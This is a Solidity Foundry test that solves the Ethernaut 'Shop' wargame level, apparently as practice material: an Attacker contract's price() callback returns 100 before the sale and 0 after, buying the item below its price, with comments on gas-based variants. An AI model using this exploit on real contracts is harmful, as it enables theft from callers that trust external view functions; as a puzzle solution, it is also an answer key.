// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Shop, Buyer} from "ethernaut/levels/Shop.sol";

contract ShopTest is Test {
    Shop target;
    address player;

    function setUp() public {
        player = makeAddr("player");

        target = new Shop();
    }

    function attack() private {
        Attacker attacker = new Attacker(target);
        attacker.pwn();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertTrue(target.isSold(), "item must be sold");
        assertLt(target.price(), 100, "price must be less than 100");
    }
}

contract Attacker is Buyer {
    Shop target;

    constructor(Shop _target) {
        target = _target;
    }

    function price() external view override returns (uint256) {
        // at the first call, we return 100 to get past the if-condition
        // then we return 0 to set the price to something lower than 100
        //
        // if we didnt have access to `isSold`, we could still do this via
        // hot vs cold storage gas cost, or via gasleft()
        return target.isSold() ? 0 : 100;
    }

    function pwn() public {
        target.buy();
    }
}
